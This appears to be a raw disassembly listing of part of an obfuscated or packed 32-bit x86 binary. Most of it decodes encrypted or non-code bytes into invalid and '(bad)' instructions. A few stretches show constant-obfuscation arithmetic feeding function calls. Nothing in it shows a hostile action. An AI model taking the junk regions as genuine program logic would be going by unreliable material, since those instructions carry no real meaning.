  418482:	and    esi,DWORD PTR [edx]
  418484:	mov    BYTE PTR [ecx],ah
  418486:	dec    ebp
  418487:	sub    esp,DWORD PTR [edi]
  418489:	sub    DWORD PTR [ecx+0x12],0x20c7b315
  418490:	inc    ebx
  418491:	jb     0x418430
  418493:	pop    esi
  418494:	or     cl,cl
  418496:	cdq    
  418497:	and    bh,dl
  418499:	mov    dl,BYTE PTR [esi]
  41849b:	adc    BYTE PTR [edx-0x2b],bl
  41849e:	arpl   WORD PTR [eax],bp
  4184a0:	mov    dh,0x36
  4184a2:	aad    0xaa
  4184a4:	push   esi
  4184a5:	mov    ?,ebp
  4184a7:	jle    0x418498
  4184a9:	pop    esp
  4184aa:	icebp  
  4184ab:	xchg   esi,eax
  4184ac:	push   edx
  4184ad:	adc    ch,BYTE PTR [edx+0x796ad0d7]
  4184b3:	loope  0x41845d
  4184b5:	arpl   sp,ax
  4184b7:	and    ebp,DWORD PTR [esi-0x34]
  4184ba:	add    edx,edx
  4184bc:	push   esi
  4184bd:	and    al,BYTE PTR [ecx]
  4184bf:	fcmovu st,st(3)
  4184c1:	cli    
  4184c2:	mov    DWORD PTR [edx*4-0x1b756355],esp
  4184c9:	mov    DWORD PTR [esp+0x34],0x4445
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0xc597c1a4
  4185cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d0:	fsub   st(7),st
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0x8
  4185d9:	paddsb mm2,QWORD PTR [ebx-0x3fe5100b]
  4185e0:	bound  edx,QWORD PTR [ebp+0x5fe089bb]
  4185e6:	(bad)  
  4185e7:	jno    0x41865f
  4185e9:	lock sub eax,0x88f890f4
  4185ef:	dec    esi
  4185f0:	bound  esp,QWORD PTR [esi-0x2a]
  4185f3:	addr16 xor bl,dh
  4185f6:	add    BYTE PTR [edx],0xf4
  4185f9:	jle    0x4185f4
  4185fb:	mov    DWORD PTR [ebx-0x40],ecx
  4185fe:	lods   al,BYTE PTR ds:[esi]
  4185ff:	adc    al,0x52
  418601:	and    bh,BYTE PTR [edx-0x6710d3f6]
  418607:	out    0x7c,eax
  418609:	jge    0x418646
  41860b:	call   0x749ae790
  418610:	mov    ch,0x6b
  418612:	mov    eax,ds:0x2d70fef5
  418617:	mov    ds,WORD PTR [eax]
  418619:	or     BYTE PTR [edi-0x61],ah
  41861c:	jl     0x41860d
  41861e:	mov    eax,0x98ee05d5
  418623:	and    ah,ah
  418625:	shr    DWORD PTR [ecx+ecx*8+0x6b077b4f],1
  41862c:	and    eax,0xa6d96535
  418631:	xchg   esp,eax
  418632:	ja     0x418603
  418634:	imul   ebx,ebx,0x54
  418637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418638:	fstp   TBYTE PTR [ecx-0x3c]
  41863b:	mov    edx,DWORD PTR [eax]
  41863d:	pop    ds
  41863e:	xchg   esp,eax
  41863f:	xor    ah,BYTE PTR [edx-0x42]
  418642:	xchg   ebx,eax
  418643:	jno    0x418608
  418645:	pop    ebp
  418646:	bound  ecx,QWORD PTR cs:[ecx]
  418649:	lds    ebp,FWORD PTR [esi]
  41864b:	sar    BYTE PTR [edx-0x45],0xe1
  41864f:	mov    esi,0xb8afc4a1
  418654:	sbb    edx,DWORD PTR [edi-0x141469fd]
  41865a:	cmp    al,0xdd
  41865c:	arpl   WORD PTR [edi+0x6a],bx
  41865f:	and    ah,BYTE PTR [ebx+0x34a1c8bf]
  418665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418666:	dec    edi
  418667:	(bad)  
  418668:	pop    edi
  418669:	js     0x4186b6
  41866b:	lods   al,BYTE PTR ds:[esi]
  41866c:	push   esi
  41866d:	adc    eax,0x762909f0
  418672:	jmp    0x4186c5
  418674:	into   
  418675:	push   cs
  418676:	push   ebp
  418677:	ds clc 
  418679:	cmp    BYTE PTR [edi+0x3c0a451e],bl
  41867f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418680:	push   esi
  418681:	jmp    0x4186b9
  418683:	adc    DWORD PTR [edi+0x30],ecx
  418686:	xchg   esp,eax
  418687:	(bad)  
  418689:	aad    0x2f
  41868b:	pop    es
  41868c:	popa   
  41868d:	mov    ebx,0x11ae6610
  418692:	pop    ss
  418693:	xlat   BYTE PTR ds:[ebx]
  418694:	in     eax,dx
  418695:	(bad)  
  418696:	(bad)  
  418697:	jp     0x4186a3
  418699:	das    
  41869a:	push   cs
  41869b:	xchg   ecx,eax
  41869c:	inc    esp
  41869d:	shl    DWORD PTR [ebx],cl
  41869f:	fmul   st(4),st
  4186a1:	out    dx,eax
  4186a2:	mov    cl,0xd2
  4186a4:	add    DWORD PTR [edx],eax
  4186a6:	sub    al,0xb8
  4186a8:	mov    bh,0xd9
  4186aa:	lods   eax,DWORD PTR ds:[esi]
  4186ab:	xchg   esp,eax
  4186ac:	(bad)  
  4186ae:	dec    edx
  4186af:	stos   DWORD PTR es:[edi],eax
  4186b0:	loope  0x41868e
  4186b2:	push   ecx
  4186b3:	out    0xaa,al
  4186b5:	xchg   ebp,eax
  4186b6:	jbe    0x418716
  4186b8:	cmp    BYTE PTR [edi],dl
  4186ba:	jmp    0x2b2f:0x18877cdb
  4186c1:	dec    esp
  4186c2:	sbb    al,0xb7
  4186c4:	xor    ah,BYTE PTR ss:[ebp+0x31]
  4186c8:	xor    cl,BYTE PTR [edx+esi*8]
  4186cb:	adc    BYTE PTR [esi+eiz*8-0x52c5d358],0x47
  4186d3:	cmp    ch,BYTE PTR [esi-0x2d2fb3da]
  4186d9:	xchg   edx,eax
  4186da:	jo     0x418680
  4186dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186dd:	ins    BYTE PTR es:[edi],dx
  4186de:	call   0x5c0e:0x65a8ed96
  4186e5:	pop    es
  4186e6:	mov    ?,WORD PTR ds:0x6ce8fb6b
  4186ec:	test   DWORD PTR [eax],edi
  4186ee:	mov    esp,0x8213dcb7
  4186f3:	fwait
  4186f4:	jmp    0x201:0x1ad099fd
  4186fb:	in     al,dx
  4186fc:	ret    0x94ad
  4186ff:	push   edi
  418700:	fucomi st,st(5)
  418702:	lods   al,BYTE PTR ds:[esi]
  418703:	cmp    cl,cl
  418705:	adc    esi,0x2c
  418708:	inc    ecx
  418709:	ret    0xaf66
  41870c:	shl    edi,cl
  41870e:	dec    edx
  41870f:	je     0x4186b3
  418711:	scas   al,BYTE PTR es:[edi]
  418712:	out    0xdc,al
  418714:	bound  ebp,QWORD PTR ds:0x37bcaca5
  41871a:	into   
  41871b:	loope  0x418760
  41871d:	ja     0x4186b1
  41871f:	jle    0x418783
  418721:	fisub  WORD PTR [ecx+0x68]
  418724:	xchg   esp,eax
  418725:	rcl    DWORD PTR [edx+0x23650196],1
  41872b:	repnz out 0x1d,eax
  41872e:	jmp    0x4a7b:0xe5e27048
  418735:	adc    al,0xa4
  418737:	(bad)  
  418738:	int    0xae
  41873a:	in     eax,dx
  41873b:	retf   0xab4e
  41873e:	not    ebx
  418740:	or     eax,0xd91e31ce
  418745:	mov    ds:0x4d8dfae5,eax
  41874a:	pop    DWORD PTR [eax]
  41874c:	retf   0xc1f1
  41874f:	mov    ebp,0x9f9ad82e
  418754:	xchg   ecx,ebx
  418756:	xor    DWORD PTR [ecx],eax
  418758:	in     eax,dx
  418759:	icebp  
  41875a:	push   ss
  41875b:	retf   
  41875c:	fld    DWORD PTR [ebp+0x29]
  41875f:	mov    bh,0xb6
  418761:	push   edx
  418762:	dec    edi
  418763:	mov    dh,0xdd
  418765:	rcr    BYTE PTR [ecx],1
  418767:	cmp    eax,0xd440a50
  41876c:	hlt    
  41876d:	ins    BYTE PTR es:[edi],dx
  41876e:	adc    ebp,esi
  418770:	test   BYTE PTR [edx],ah
  418772:	add    al,0x12
  418774:	add    BYTE PTR [edx-0xcc0afd5],cl
  41877a:	bound  edi,QWORD PTR [ecx]
  41877c:	sti    
  41877d:	stos   BYTE PTR es:[edi],al
  41877e:	mov    ch,0x6d
  418780:	inc    esi
  418781:	or     ebx,edx
  418783:	inc    eax
  418784:	shr    BYTE PTR [ebx],cl
  418786:	test   dh,dl
  418788:	dec    ebp
  418789:	inc    esi
  41878a:	out    0xf1,al
  41878c:	push   edi
  41878d:	pushf  
  41878e:	test   BYTE PTR [edx],cl
  418790:	iret   
  418791:	stos   DWORD PTR es:[edi],eax
  418792:	and    al,bl
  418794:	(bad)  
  418795:	(bad)  
  418796:	jo     0x418761
  418798:	adc    ebp,DWORD PTR [edi+0xe0cdf0e]
  41879e:	out    0x53,eax
  4187a0:	test   al,0x2f
  4187a2:	ret    0xae90
  4187a5:	mov    edi,0xcf3291d1
  4187aa:	mov    ch,0x90
  4187ac:	mov    esi,0xf806b680
  4187b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b2:	push   edx
  4187b3:	xor    ch,BYTE PTR [edx+0x7de4bcaa]
  4187b9:	mov    dh,0x66
  4187bb:	mov    edi,0x36de2703
  4187c0:	mov    bh,0xdc
  4187c2:	fst    QWORD PTR [esi-0x256d3816]
  4187c8:	(bad)  
  4187c9:	jg     0x418834
  4187cb:	sbb    al,0xec
  4187cd:	mov    al,0xa7
  4187cf:	hlt    
  4187d0:	imul   DWORD PTR [eax+ecx*8+0x7926f6cf]
  4187d7:	cld    
  4187d8:	mov    dl,BYTE PTR [edx+0x4e]
  4187db:	pop    esi
  4187dc:	jb     0x41875f
  4187de:	cmp    al,0x73
  4187e0:	sbb    dl,dl
  4187e2:	add    eax,0x3f516e8b
  4187e7:	loop   0x4187b6
  4187e9:	fist   WORD PTR [ecx]
  4187eb:	ss pop edx
  4187ed:	push   ss
  4187ee:	fiadd  WORD PTR [ebx]
  4187f0:	aam    0x37
  4187f2:	inc    esp
  4187f3:	sbb    ch,BYTE PTR [ebp-0x6bdadae1]
  4187f9:	pop    edx
  4187fa:	mov    edx,0x53f4249d
  4187ff:	and    BYTE PTR [edx-0x31f0235d],cl
  418805:	fmul   QWORD PTR [edx+0x1e810825]
  41880b:	sbb    eax,0x3aa0ac76
  418810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418811:	fadd   QWORD PTR [edx-0x69]
  418814:	aaa    
  418815:	sub    dl,BYTE PTR [eax+0x3646056d]
  41881b:	add    BYTE PTR [eax],al
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi-0x4da7b070],ebx
  418894:	iret   
  418895:	push   ebx
  418896:	repz sar BYTE PTR [esi-0x41413dcb],0xcd
  41889e:	adc    bl,BYTE PTR [eax-0x2883d3f]
  4188a4:	sbb    bh,BYTE PTR [eax]
  4188a6:	xor    bl,ah
  4188a8:	xchg   edi,eax
  4188aa:	pop    ebp
  4188ab:	and    ebp,DWORD PTR [ebp+0x75c48931]
  4188b1:	dec    ebp
  4188b2:	es mov eax,0xe1a06bc7
  4188b8:	aam    0x6
  4188ba:	fcom   DWORD PTR [edx]
  4188bc:	inc    edi
  4188bd:	xchg   BYTE PTR es:[esi],al
  4188c0:	jns    0x418887
  4188c2:	test   eax,0xcb60989b
  4188c7:	xchg   ebx,eax
  4188c8:	jg     0x4188f3
  4188ca:	inc    edi
  4188cb:	in     al,0xca
  4188cd:	enter  0x2a0d,0xc6
  4188d1:	retf   0x2074
  4188d4:	jmp    0x3b7a:0xc621ba49
  4188db:	iret   
  4188dc:	mov    al,BYTE PTR [eax+0x21b51883]
  4188e2:	into   
  4188e3:	cmp    BYTE PTR [ecx+0x17017681],0x23
  4188ea:	scas   eax,DWORD PTR es:[edi]
  4188eb:	test   BYTE PTR [eax],ch
  4188ed:	stos   BYTE PTR es:[edi],al
  4188ee:	cmp    DWORD PTR [eax+0x1c],0xf681497
  4188f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f6:	push   edx
  4188f7:	or     DWORD PTR ds:0xd5d4f9bc,0x3035535e
  418901:	ja     0x4188bc
  418903:	pop    ds
  418904:	xchg   esi,eax
  418905:	jge    0x418919
  418907:	ins    DWORD PTR es:[edi],dx
  418908:	push   es
  418909:	cmp    BYTE PTR [ebx],al
  41890b:	mov    edx,0xd62990d5
  418910:	pop    ds
  418911:	pop    esp
  418912:	std    
  418913:	inc    ebp
  418914:	or     al,0x5
  418916:	ja     0x4188c5
  418918:	test   BYTE PTR [edi],0x80
  41891b:	in     eax,dx
  41891c:	mov    bl,0xf7
  41891e:	adc    edx,DWORD PTR [edi-0x70]
  418921:	hlt    
  418922:	or     al,0xd0
  418924:	xor    BYTE PTR [edx],ch
  418926:	test   DWORD PTR [ebp+0x1e],ebp
  418929:	stos   BYTE PTR es:[edi],al
  41892a:	cld    
  41892b:	dec    edi
  41892c:	cdq    
  41892d:	and    ebx,DWORD PTR [eax-0x4f]
  418930:	sub    edi,0x28
  418933:	and    eax,0x9a68ff9f
  418938:	icebp  
  418939:	mov    eax,ds:0xac75c2f3
  41893e:	std    
  41893f:	dec    esp
  418940:	sub    al,0xa5
  418942:	mov    BYTE PTR ds:0x5ee6e466,bh
  418948:	push   0xfffffff0
  41894a:	add    dh,dl
  41894c:	mov    cs,ebx
  41894e:	cs inc esp
  418950:	cmp    BYTE PTR [ebx+0x40],al
  418953:	or     eax,0xa6c6a965
  418958:	push   ebx
  418959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895a:	scas   eax,DWORD PTR es:[edi]
  41895b:	sbb    ecx,esi
  41895d:	jnp    0x418999
  41895f:	jae    0x4188f7
  418961:	aad    0x23
  418963:	and    eax,0x6833c6e0
  418968:	lea    ecx,[ebp-0x6]
  41896b:	das    
  41896c:	cmp    eax,0xe7bf514a
  418971:	ins    BYTE PTR es:[edi],dx
  418972:	daa    
  418973:	into   
  418974:	sar    BYTE PTR [edx-0x72],0xd3
  418978:	scas   al,BYTE PTR es:[edi]
  418979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41897a:	in     al,dx
  41897b:	pop    ecx
  41897c:	data16 cmp al,0xa0
  41897f:	shr    BYTE PTR [eax+0x2a],0xf5
  418983:	mov    eax,ds:0xd06d7463
  418988:	sub    eax,0xfb3dac04
  41898d:	add    eax,DWORD PTR [ebx+0x5e]
  418990:	loopne 0x418991
  418992:	mov    ebp,0xc77ad858
  418997:	pop    edx
  418998:	pop    esi
  418999:	sub    bh,BYTE PTR [esi]
  41899b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899c:	(bad)  
  41899d:	jecxz  0x418a0f
  41899f:	dec    edx
  4189a0:	lock mov WORD PTR [eax+0x7],ss
  4189a4:	(bad)  
  4189a5:	fiadd  WORD PTR [edx*1+0x2857a469]
  4189ac:	mov    eax,fs
  4189ae:	jecxz  0x41896c
  4189b0:	and    DWORD PTR [edi],0x3e415015
  4189b6:	xchg   edi,eax
  4189b7:	add    DWORD PTR [edi+edi*1],0x1f7b5f91
  4189be:	dec    edi
  4189bf:	ins    BYTE PTR es:[edi],dx
  4189c0:	(bad)  
  4189c1:	add    BYTE PTR [edi+0x5b],al
  4189c4:	inc    eax
  4189c5:	cli    
  4189c6:	sbb    eax,0xf628f2f5
  4189cb:	mov    al,0x38
  4189cd:	mov    bh,0x8c
  4189cf:	xor    DWORD PTR [ecx+ebp*8+0x73],ebp
  4189d3:	adc    ebx,DWORD PTR [esi+0x1f]
  4189d6:	je     0x418a26
  4189d8:	sub    esi,DWORD PTR [eax+0x673557a2]
  4189de:	ret    0xbe32
  4189e1:	ret    
  4189e2:	ja     0x418a0f
  4189e4:	(bad)  
  4189e6:	iret   
  4189e7:	div    DWORD PTR [ebp+0x1a]
  4189ea:	and    al,0x54
  4189ec:	mov    al,0x72
  4189ee:	imul   esi,esi,0x52
  4189f1:	pop    edi
  4189f2:	ja     0x4189fd
  4189f4:	mov    ah,BYTE PTR [edi+0x3b]
  4189f7:	cli    
  4189f8:	aas    
  4189f9:	fwait
  4189fa:	dec    esi
  4189fb:	test   al,0x2a
  4189fd:	test   al,0x41
  4189ff:	ins    BYTE PTR es:[edi],dx
  418a00:	mov    bl,0xb1
  418a02:	std    
  418a03:	pop    es
  418a04:	es sub al,0xe3
  418a07:	adc    BYTE PTR [ebx-0x2ed300a2],bl
  418a0d:	mov    edx,0x41a93ae9
  418a12:	or     edx,DWORD PTR [ebp+0x1a5826bc]
  418a18:	mov    ecx,0xba2df8a8
  418a1d:	mov    DWORD PTR [ebp+0x70],ecx
  418a20:	in     eax,dx
  418a21:	in     al,dx
  418a22:	leave  
  418a23:	dec    ecx
  418a24:	(bad)  
  418a25:	call   0x3e31:0x47bec9e9
  418a2c:	ins    BYTE PTR es:[edi],dx
  418a2d:	stc    
  418a2e:	mov    eax,ds:0x372bcfab
  418a33:	fldcw  WORD PTR [ebp+0x4e]
  418a36:	inc    edi
  418a37:	jns    0x418a59
  418a39:	jns    0x418ab9
  418a3b:	add    edi,DWORD PTR ds:0x5b31093e
  418a41:	add    bh,al
  418a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a44:	adc    al,0xef
  418a46:	(bad)  
  418a47:	push   ss
  418a48:	inc    edi
  418a49:	push   ebp
  418a4a:	pop    ecx
  418a4b:	mov    edx,0xdafa3565
  418a50:	ret    
  418a51:	pop    edi
  418a52:	mov    ds:0x608fe676,eax
  418a57:	ins    DWORD PTR es:[edi],dx
  418a58:	imul   edi,DWORD PTR [ebp+0x2e],0x71
  418a5c:	int    0xcd
  418a5e:	inc    esp
  418a5f:	pop    ebx
  418a60:	jmp    0xf04a0515
  418a65:	arpl   WORD PTR [edi],si
  418a67:	adc    cl,BYTE PTR [esi+0x27]
  418a6a:	xor    DWORD PTR [edi+0x55a46075],0x63
  418a71:	mov    esp,0x78af362f
  418a76:	push   ds
  418a77:	lahf   
  418a78:	inc    ebp
  418a79:	push   esp
  418a7a:	xor    edi,0x2d9ae99a
  418a80:	add    edx,esp
  418a82:	lods   al,BYTE PTR ds:[esi]
  418a83:	dec    ebx
  418a84:	cmp    al,0xad
  418a86:	add    BYTE PTR ds:0xb39ff205,dh
  418a8c:	repz ret 
  418a8e:	jb     0x418af3
  418a90:	sbb    BYTE PTR [esi+0x6f],al
  418a93:	test   BYTE PTR [edx-0x490bcf1b],bh
  418a99:	jecxz  0x418afa
  418a9b:	cmc    
  418a9c:	push   0x9dd29a3f
  418aa1:	mov    bh,0xea
  418aa3:	jmp    0xbaf8d654
  418aa8:	sbb    bh,BYTE PTR fs:[eax+0x2]
  418aac:	je     0x418a34
  418aae:	jbe    0x418ad0
  418ab0:	mov    ecx,0xd6c56f75
  418ab5:	cmp    bh,ah
  418ab7:	push   cs
  418ab8:	ret    0x5ece
  418abb:	pop    edx
  418abc:	cmp    edx,esp
  418abe:	cmc    
  418abf:	rcr    BYTE PTR [ecx+eax*1-0x4e175778],cl
  418ac6:	sbb    ah,cl
  418ac8:	sbb    DWORD PTR [ecx],edi
  418aca:	jecxz  0x418a7c
  418acc:	or     al,0x27
  418ace:	dec    ebx
  418acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad0:	xchg   esi,eax
  418ad1:	mov    ch,0x84
  418ad3:	int3   
  418ad4:	inc    ebp
  418ad5:	cwde   
  418ad6:	jge    0x418acd
  418ad8:	or     al,0x1b
  418ada:	dec    ebx
  418adb:	imul   ecx,edi,0x1024448b
  418ae1:	mov    ecx,DWORD PTR [esp+0x14]
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x422286
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x422286
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	shl    ah,1
  418b2a:	pop    esp
  418b2b:	ror    ebx,1
  418b2d:	test   eax,0xbec235be
  418b33:	mov    esi,0xd93164cd
  418b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b39:	test   al,0x1e
  418b3b:	nop
  418b3c:	dec    ebx
  418b3d:	add    BYTE PTR [edx+0x71a8289f],dl
  418b43:	aaa    
  418b44:	clc    
  418b45:	inc    esi
  418b46:	stos   DWORD PTR es:[edi],eax
  418b47:	push   ss
  418b48:	add    ecx,DWORD PTR [eax+0x17]
  418b4b:	aam    0x1
  418b4d:	sub    al,0xf6
  418b4f:	or     eax,0x7fe85535
  418b54:	xchg   bh,dl
  418b56:	fstp   DWORD PTR [esp+eax*2+0x353b818c]
  418b5d:	cmp    bh,bh
  418b5f:	dec    ebp
  418b60:	stos   BYTE PTR es:[edi],al
  418b61:	ret    0x73fb
  418b64:	jle    0x418b29
  418b66:	sbb    ebx,DWORD PTR [ecx]
  418b68:	mov    WORD PTR [ebx],gs
  418b6a:	push   0x3c238de1
  418b6f:	inc    edi
  418b70:	out    dx,al
  418b71:	test   eax,0x52643548
  418b76:	pop    ecx
  418b77:	aaa    
  418b78:	inc    ebp
  418b79:	mov    ebx,0x709b8051
  418b7e:	pop    ds
  418b7f:	mov    bl,BYTE PTR [edx-0x59]
  418b82:	aam    0x3c
  418b84:	gs xor bl,cl
  418b87:	jbe    0x418bff
  418b89:	imul   edx,eax,0x425dbb33
  418b8f:	scas   eax,DWORD PTR es:[edi]
  418b90:	push   esp
  418b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b92:	jns    0x418b17
  418b94:	popa   
  418b95:	jne    0x418bee
  418b97:	sub    al,0x33
  418b99:	scas   eax,DWORD PTR es:[edi]
  418b9a:	push   ecx
  418b9b:	popf   
  418b9c:	ins    DWORD PTR es:[edi],dx
  418b9d:	adc    dl,BYTE PTR [esi+0x6e]
  418ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ba1:	mov    al,ds:0x508d80e4
  418ba6:	mov    ds:0xfe7625e2,eax
  418bab:	mov    eax,ds:0xc5eddd7e
  418bb0:	fcom   QWORD PTR [ecx+edi*8+0x6b4136fc]
  418bb7:	or     BYTE PTR [ebx-0x53be6df0],ch
  418bbd:	scas   eax,DWORD PTR es:[edi]
  418bbe:	out    0x2d,eax
  418bc0:	pusha  
  418bc1:	enter  0x8888,0xc3
  418bc5:	mul    ebx
  418bc7:	mov    ah,0x85
  418bc9:	fdivr  DWORD PTR [ebx]
  418bcb:	xchg   esi,eax
  418bcc:	mov    bh,ch
  418bce:	pushf  
  418bcf:	lods   eax,DWORD PTR ds:[esi]
  418bd0:	jecxz  0x418c14
  418bd2:	mov    dl,0xa2
  418bd4:	sbb    DWORD PTR [ebx-0x6e],ebp
  418bd7:	popa   
  418bd8:	adc    eax,0x2bf17b8b
  418bdd:	pop    eax
  418bde:	loop   0x418c1c
  418be0:	mov    bh,0x51
  418be2:	(bad)  
  418be3:	jb     0x418c12
  418be5:	dec    ebx
  418be6:	(bad)  
  418be7:	mov    al,ds:0x597405cc
  418bec:	lds    edx,FWORD PTR [edx-0x3a]
  418bef:	leave  
  418bf0:	test   BYTE PTR [ecx+0x2c0875ff],al
  418bf6:	or     ah,dh
  418bf8:	lock pop ecx
  418bfa:	and    eax,0x65001be5
  418bff:	jle    0x418bba
  418c01:	sbb    BYTE PTR ds:0x4b0c8d57,al
  418c07:	test   al,0xaa
  418c09:	xchg   edx,eax
  418c0a:	scas   al,BYTE PTR es:[edi]
  418c0b:	rcl    BYTE PTR ds:0xfdf6657a,1
  418c11:	pop    ecx
  418c12:	loop   0x418bd2
  418c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c15:	dec    ebp
  418c16:	adc    bh,BYTE PTR [ebx+0x37ca5aab]
  418c1c:	and    DWORD PTR [ebx+0x14],ebx
  418c1f:	or     BYTE PTR [esi-0x414fde15],bl
  418c25:	inc    edx
  418c26:	adc    ecx,DWORD PTR [edi+0x7e855332]
  418c2c:	adc    eax,0x3e67e1e8
  418c31:	mov    dl,0x75
  418c33:	or     cl,bl
  418c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c36:	pop    es
  418c37:	inc    edx
  418c38:	mov    al,BYTE PTR [edx-0x2e2cc59a]
  418c3e:	lods   al,BYTE PTR ds:[esi]
  418c3f:	add    al,0xc8
  418c41:	test   eax,0x852dee44
  418c46:	aad    0xcf
  418c48:	jnp    0x418bee
  418c4a:	sbb    BYTE PTR [ebx+eiz*4-0x2],0x9
  418c4f:	jbe    0x418bf1
  418c51:	mov    WORD PTR [eax+0x46add3a4],?
  418c57:	mov    al,0x9a
  418c59:	adc    al,0xb9
  418c5b:	leave  
  418c5c:	inc    esp
  418c5d:	pop    ebp
  418c5e:	shl    DWORD PTR [edx+0x41],0x81
  418c62:	fs sbb al,0x65
  418c65:	rcl    BYTE PTR [ecx],cl
  418c67:	ret    0xad68
  418c6a:	sub    edi,DWORD PTR [ecx-0x5461beff]
  418c70:	inc    edx
  418c71:	sahf   
  418c72:	loop   0x418cb9
  418c74:	stos   DWORD PTR es:[edi],eax
  418c75:	aad    0xdd
  418c77:	pop    edi
  418c78:	sbb    DWORD PTR [esi+0x34],eax
  418c7b:	jl     0x418cb1
  418c7d:	iret   
  418c7e:	mov    ebp,DWORD PTR [ecx]
  418c80:	fsub   st(0),st
  418c82:	stos   BYTE PTR es:[edi],al
  418c83:	fcom   QWORD PTR [eax-0x194c8457]
  418c89:	in     al,0x6f
  418c8b:	retf   0x230c
  418c8e:	sbb    BYTE PTR [ecx-0x56],cl
  418c91:	rol    DWORD PTR [eax+0x0],0xe8
  418c95:	mov    ds:0xf24973d2,eax
  418c9a:	fmul   QWORD PTR [edi]
  418c9c:	fld    QWORD PTR [ebx+0x40]
  418c9f:	sbb    BYTE PTR [ebp+0xdb374a2],0x2c
  418ca6:	retf   
  418ca7:	ds cs (bad) 
  418caa:	jge    0x418cb4
  418cac:	nop
  418cad:	mov    ebx,0xf6ddb4b5
  418cb2:	adc    BYTE PTR [ebx+ebp*1+0x5b9f559e],cl
  418cb9:	cwde   
  418cba:	retf   0xe951
